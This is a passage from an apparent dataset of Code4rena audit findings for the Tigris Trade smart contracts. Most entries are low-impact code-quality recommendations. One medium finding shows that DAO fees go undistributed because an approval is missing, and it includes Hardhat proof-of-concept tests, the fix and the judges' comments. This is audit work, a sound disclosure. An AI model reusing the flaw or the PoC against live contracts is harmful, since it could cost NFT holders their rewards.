      "content": "\nConsider defining in only one contract so that values cannot become out of sync when only one location is updated. \n\nA cheap way to store constants in a single location is to create an internal constant in a library. If the variable is a local cache of another contracts value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers dont get out of sync.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L95\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/TradingExtension.sol#L11\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43190",
      "title": "[25] Imports can be grouped together",
      "impact": "LOW",
      "content": "\nConsider importing OZ first, then all interfaces, then all utils.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L4-L12\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/TradingExtension.sol#L4-L8\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43189",
      "title": "[24] Named imports can be used",
      "impact": "LOW",
      "content": "\nIt's possible to name the imports to improve code readability. E.g. `import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";` can be rewritten as `import {IERC20} from import @openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol;`\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L6\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43188",
      "title": "[23] Draft OpenZeppelin dependencies",
      "impact": "LOW",
      "content": "\nOpenZeppelin contracts may be considered draft contracts if they have not received adequate security auditing or are liable to change with future development.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableToken.sol#L4\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableToken.sol#L7\n\n### Recommendation\n\nConsider waiting until the contract is finalized. Otherwise, make sure that the development team is aware of the risks of using a draft OpenZeppelin contract and accept the risk-benefit trade-off.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43187",
      "title": "[22] Remove console.log import in `Lock.sol`",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L4\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43186",
      "title": "[21] Move require/validation statements to the top of the function when validating input parameters",
      "impact": "LOW",
      "content": "\nConsider moving the validation on [L966](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L966) above the conditional on [L955](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L955) for `Trading.setFees()`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43185",
      "title": "[20] Interchangeable usage of uint and uint256",
      "impact": "LOW",
      "content": "\nConsider using only one approach throughout the codebase, e.g. only uint or only uint256.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L223-L224\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L316-L317\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43184",
      "title": "[19] Missing NATSPEC",
      "impact": "LOW",
      "content": "\nConsider adding NATSPEC on all public/external functions to improve documentation.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/TradingExtension.sol#L190\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L168\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L183\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L349\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43183",
      "title": "[18] Critical changes should use two-step procedure",
      "impact": "LOW",
      "content": "\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two-step procedure on the critical functions.\n\nConsider adding a two-steps pattern on critical changes to avoid mistakenly transferring ownership of roles or critical functionalities to the wrong address.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L366-L370\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43182",
      "title": "[17] Lack of spacing in comment",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L863\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43181",
      "title": "[16] Declaring a `return named variable` and returning a manual value for the same function",
      "impact": "LOW",
      "content": "\nConsider refactoring the function `MetaContext._msgSender` to use `sender` on [L25](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/MetaContext.sol#L25). E.g. `sender = super._msgSender()`. This will make the function more consistent with the usage of the `return named variable` declared in the function header.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43180",
      "title": "[15] Add a limit for the maximum number of characters per line",
      "impact": "LOW",
      "content": "\nThe solidity [documentation](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#maximum-line-length) recommends a maximum of 120 characters.\n\nConsider adding a limit of 120 characters or less to prevent large lines.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L178\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43179",
      "title": "[14] Use `private constant` consistently",
      "impact": "LOW",
      "content": "\nReplace `constant private` with `private constant`.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L95\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43178",
      "title": "[13] Constants should be upper case",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L96\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43177",
      "title": "[12] Declare interfaces on separate files",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L14-L77\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L9-L13\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L15-L25\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43176",
      "title": "[11] Use time units directly",
      "impact": "LOW",
      "content": "\nThe value `1 days` can be used directly as the constant on [L10](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L10) of `BondNFT.sol` is not needed.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43175",
      "title": "[10] Contract layout and order of functions",
      "impact": "LOW",
      "content": "\nThe Solidity style guide [recommends](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-layout) declaring state variables before all functions. Consider moving the state variables from the GovNFT instance highlighted below to the top of the contract.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L263-L269\n\nAnother [recommendation](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions) is to declare internal functions below external functions. \n\nThe instances below highlights internal above external. If possible, consider adding internal functions below external functions for the contract layout.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L884\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L898-L901\n\nFurthermore, it's also recommended to declare pure and view functions at the end of a grouping.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L857\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43174",
      "title": "[09] Pragma float",
      "impact": "LOW",
      "content": "\nAll the contracts in scope are floating the pragma version.\n\n### Recommendation\n\nLocking the pragma helps to ensure that contracts do not accidentally get deployed using an outdated compiler version.\n\nNote that pragma statements can be allowed to float when a contract is intended for consumption by other developers, as in the case with contracts in a library or a package.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43173",
      "title": "[08] Missing unit tests",
      "impact": "LOW",
      "content": "\nIt is crucial to write tests with possibly 100% coverage for smart contracts.\n\nThe following functions are not covered:\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L206-L216\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L311-L313\n\n### Recommendation\n\nIt is recommended to write tests for all possible code flows.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43172",
      "title": "[07] Add an event for critical parameter changes",
      "impact": "LOW",
      "content": "\nAdding events for critical parameter changes will facilitate offchain monitoring and indexing.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L898-L9051\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L912-L920\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L926-L933\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L939-L941\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L952-L969\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L975-L979\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/MetaContext.sol#L9-L11\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43171",
      "title": "[06] Lack of zero address checks for `Trading.sol` constructor for the variables `_position`, `_gov` and `_pairsContract`",
      "impact": "LOW",
      "content": "\nIf these variable get configured with address zero, failure to immediately reset the value can result in unexpected behavior for the project.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L143-L152\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43170",
      "title": "[05] Lack of checks-effects-interactions",
      "impact": "LOW",
      "content": "\nIt's recommended to execute external calls after state changes, to prevent reetrancy bugs.\n\nConsider moving the external calls after the state changes on the following instances:\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L72-L73\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L216-L226\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43169",
      "title": "[04] Usage of deprecated chainlink API",
      "impact": "LOW",
      "content": "\n`latestAnswer()` from chainlink is deprecated and can return stale data.\n\n### Recommendation\n\nUse `latestRoundData()` instead of `latestAnswer()`. Also, adding checks for [additional fields](https://docs.chain.link/data-feeds/price-feeds/api-reference/#latestrounddata) returned from `latestRoundData()` is recommended. E.g.\n\n```\n(uint80 roundID, int256 price,,uint256 timestamp, uint80 answeredInRound) = chainlink.latestRoundData();\nrequire(timestamp != 0, \"round not complete\");\nrequire(answeredInRound >= roundID, \"stale data\");\nrequire(price != 0, \"chainlink error\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43168",
      "title": "[03] Use the safe variant and `ERC721.mint`",
      "impact": "LOW",
      "content": "\n`.mint` won't check if the recipient is able to receive the NFT. If an incorrect  address is passed, it will result in a silent failure and loss of asset.\n\nOpenZeppelin [recommendation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L277) is to use the safe variant of `_mint`.\n\n### Recommendation\n\nReplace `_mint()` with `_safeMint()`.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L313\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L56\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L70\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43167",
      "title": "[02] Unbounded loop",
      "impact": "LOW",
      "content": "\nNew assets are pushed into the state variable `assets` array, at the function `BondNFT.addAsset()`.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L352\n\n`Lock.claimGovFees()` will iterate all the assets.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L110-L120\n\nCurrently, `assets` can grow indefinitely. E.g. there's no maximum limit and there's no functionality to remove assets.\n\nIf the array grows too large, calling `Lack.claimGovFeeds()` might run out of gas and revert. Claiming and distributing rewards will result in a DOS condition.\n\n### Recommendation\n\nAdd a functionality to delete assets or add a maximum size limit for assets.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43166",
      "title": "[01] Use `.call` instead of `.transfer` to send ether",
      "impact": "LOW",
      "content": "\n`.transfer` will relay 2300 gas and `.call` will relay all the gas. If the receive/fallback function from the recipient proxy contract has complex logic, using `.transfer` will fail, causing integration issues.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L588\n\n### Recommendation\n\nReplace `.transfer` with `.call`. Note that the result of `.call` need to be checked. \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43165",
      "title": "[M-23] Governance NFT holder, whose NFT was minted before `Trading._handleOpenFees` function is called, can lose deserved rewards after `Trading._handleOpenFees` function is called",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294>\n\n### Impact\n\nCalling the following `Trading._handleOpenFees` function does not approve the `GovNFT` contract for spending any of the `Trading` contract's `_tigAsset` balance, which is unlike calling the `Trading._handleCloseFees` function below that executes `IStable(_tigAsset).approve(address(gov), type(uint).max)`. Due to this lack of approval, when calling the `Trading._handleOpenFees` function without the `Trading._handleCloseFees` function being called for the same `_tigAsset` beforehand, the `GovNFT.distribute` function's execution of `IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount)` in the `try...catch...` block will not transfer any `_tigAsset` amount as the trade's DAO fees to the `GovNFT` contract. \n\nIn this case, although the Governance NFT holder, whose NFT was minted before the `Trading._handleOpenFees` function is called, deserves the rewards from the DAO fees generated by the trade, this holder does not have any pending rewards after such `Trading._handleOpenFees` function call because none of the DAO fees were transferred to the `GovNFT` contract. Hence, this Governance NFT holder loses the rewards that she or he is entitled to.\n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750>\n\n```solidity\n    function _handleOpenFees(\n        uint _asset,\n        uint _positionSize,\n        address _trader,\n        address _tigAsset,\n        bool _isBot\n    )\n        internal\n        returns (uint _feePaid)\n    {\n        ...\n        unchecked {\n            uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT;\n            ...\n            IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n        }\n        gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n    }\n```\n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810>\n\n```solidity\n    function _handleCloseFees(\n        uint _asset,\n        uint _payout,\n        address _tigAsset,\n        uint _positionSize,\n        address _trader,\n        bool _isBot\n    )\n        internal\n        returns (uint payout_)\n    {\n        ...\n        IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n        IStable(_tigAsset).approve(address(gov), type(uint).max);\n        gov.distribute(_tigAsset, _daoFeesPaid);\n        return payout_;\n    }\n```\n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294>\n\n```solidity\n    function distribute(address _tigAsset, uint _amount) external {\n        if (assets.length == 0 || assets[assetsIndex[_tigAsset]] == address(0) || totalSupply() == 0 || !_allowedAsset[_tigAsset]) return;\n        try IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount) {\n            accRewardsPerNFT[_tigAsset] += _amount/totalSupply();\n        } catch {\n            return;\n        }\n    }\n```\n\n### Proof of Concept\n\nFunctions like `Trading.initiateMarketOrder` further call the `Trading._handleOpenFees` function so this POC uses the `Trading.initiateMarketOrder` function.\n\nPlease add the following test in the `Signature verification` `describe` block in `test\\07.Trading.js`. This test will pass to demonstrate the described scenario. Please see the comments in this test for more details.\n\n```typescript\n    it.only(\"Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called, can lose deserved rewards after initiateMarketOrder function is called\", async function () {\n      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"30000\"), parseEther(\"10000\"), ethers.constants.HashZero];\n      let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n\n      // one Governance NFT is minted to owner before initiateMarketOrder function is called\n      const GovNFT = await deployments.get(\"GovNFT\");\n      const govnft = await ethers.getContractAt(\"GovNFT\", GovNFT.address);\n      await govnft.connect(owner).mint();\n\n      // calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract\n      await expect(trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address))\n        .to.emit(trading, 'FeesDistributed')\n        .withArgs(stabletoken.address, \"10000000000000000000\", \"0\", \"0\", \"0\", ethers.constants.AddressZero);\n\n      // another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called\n      await govnft.connect(owner).mint();\n      await govnft.connect(owner).transferFrom(owner.getAddress(), user.getAddress(), 1);\n\n      // user's pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called\n      expect(await govnft.pending(user.getAddress(), stabletoken.address)).to.equal(\"0\");\n\n      // owner's Governance NFT was minted before initiateMarketOrder function was called so her or his pending reward amount should be 10000000000000000000.\n      // However, owner's pending reward amount is still 0 because DAO fees were not transferred to GovNFT contract successfully.\n      expect(await govnft.pending(owner.getAddress(), stabletoken.address)).to.equal(\"0\");\n    });\n```\n\nFurthermore, as a suggested mitigation, please add `IStable(_tigAsset).approve(address(gov), type(uint).max);` in the `_handleOpenFees` function as follows in line 749 of `contracts\\Trading.sol`.\n\n```solidity\n689:     function _handleOpenFees(\n690:         uint _asset,\n691:         uint _positionSize,\n692:         address _trader,\n693:         address _tigAsset,\n694:         bool _isBot\n695:     )\n696:         internal\n697:         returns (uint _feePaid)\n698:     {\n699:         IPairsContract.Asset memory asset = pairsContract.idToAsset(_asset);\n...\n732:         unchecked {\n733:             uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT;\n734:             _feePaid =\n735:                 _positionSize\n736:                 * (_fees.burnFees + _fees.botFees) // get total fee%\n737:                 / DIVISION_CONSTANT // divide by 100%\n738:                 + _daoFeesPaid;\n739:             emit FeesDistributed(\n740:                 _tigAsset,\n741:                 _daoFeesPaid,\n742:                 _positionSize * _fees.burnFees / DIVISION_CONSTANT,\n743:                 _referrer != address(0) ? _positionSize * _fees.referralFees / DIVISION_CONSTANT : 0,\n744:                 _positionSize * _fees.botFees / DIVISION_CONSTANT,\n745:                 _referrer\n746:             );\n747:             IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n748:         }\n749:         IStable(_tigAsset).approve(address(gov), type(uint).max);   // @audit add this line of code for POC purpose\n750:         gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n751:     }\n```\n\nThen, as a comparison, the following test can be added in the `Signature verification` `describe` block in `test\\07.Trading.js`. This test will pass to demonstrate that the Governance NFT holder's pending rewards is no longer 0 after implementing the suggested mitigation. Please see the comments in this test for more details.\n\n```typescript\n    it.only(`If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called,\n             can receive deserved rewards after initiateMarketOrder function is called`, async function () {\n      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"30000\"), parseEther(\"10000\"), ethers.constants.HashZero];\n      let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n\n      // one Governance NFT is minted to owner before initiateMarketOrder function is called\n      const GovNFT = await deployments.get(\"GovNFT\");\n      const govnft = await ethers.getContractAt(\"GovNFT\", GovNFT.address);\n      await govnft.connect(owner).mint();\n\n      // calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract\n      await expect(trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address))\n        .to.emit(trading, 'FeesDistributed')\n        .withArgs(stabletoken.address, \"10000000000000000000\", \"0\", \"0\", \"0\", ethers.constants.AddressZero);\n\n      // another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called\n      await govnft.connect(owner).mint();\n      await govnft.connect(owner).transferFrom(owner.getAddress(), user.getAddress(), 1);\n\n      // user's pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called\n      expect(await govnft.pending(user.getAddress(), stabletoken.address)).to.equal(\"0\");\n\n      // If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, owner's pending reward amount should be 10000000000000000000\n      //   because her or his Governance NFT was minted before initiateMarketOrder function was called.\n      expect(await govnft.pending(owner.getAddress(), stabletoken.address)).to.equal(\"10000000000000000000\");\n    });\n```\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L749> can be updated to the following code.\n\n```solidity\n        IStable(_tigAsset).approve(address(gov), type(uint).max);\n        gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n```\n\n**[TriHaz (Tigris Trade) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/649#issuecomment-1374442558):**\n > That will happen only with the first opened position until `_handleCloseFees()` is called.\n >\n> Valid but I think it should be low risk as it will mostly not affect anyone. \n>\n> Also the funds that are not distributed will be distributed later because of  `gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));` so no funds will be lost.\n> \n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/649#issuecomment-1385513708):**\n > The warden has shown how, due to a lack of approvals, the rewards earned until the first call to `_handleCloseFees`\n> \n> We also know that `_handleDeposit` will burn the balance of `tigAsset` that is unused.\n> \n> The risk however, is limited to the first (one or) few users, for this reason I believe that Medium Severity is more appropriate.\n> \n> Adding an approval on deployment or before calling `distribute` should help mitigate.\n> \n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/649#issuecomment-1407815329):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177034 \n\n\n\n***\n\n",
      "summary": "\nSummary:\n\nThe bug report discusses an issue with the `Trading._handleOpenFees` function not properly approving the `GovNFT` contract for spending the `Trading` contract's `_tigAsset` balance. This leads to the `GovNFT.distribute` function not transferring any `_tigAsset` amount as trade's DAO fees to the `GovNFT` contract. This results in the Governance NFT holder, whose NFT was minted before the `Trading._handleOpenFees` function was called, losing the rewards they are entitled to. The suggested mitigation is to add a line of code in the `_handleOpenFees` function to approve the `GovNFT` contract for spending the `_tigAsset` balance. The severity of this issue has been debated, with the final resolution being a Medium severity. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/649",
      "tags": [],
      "finders": [
        "rbserver",
        "cccz",
        "bin2chen",
        "KingNFT",
        "HE1M",
        "stealthyz",
        "unforgiven"
      ]
    },
    {
      "id": "43164",
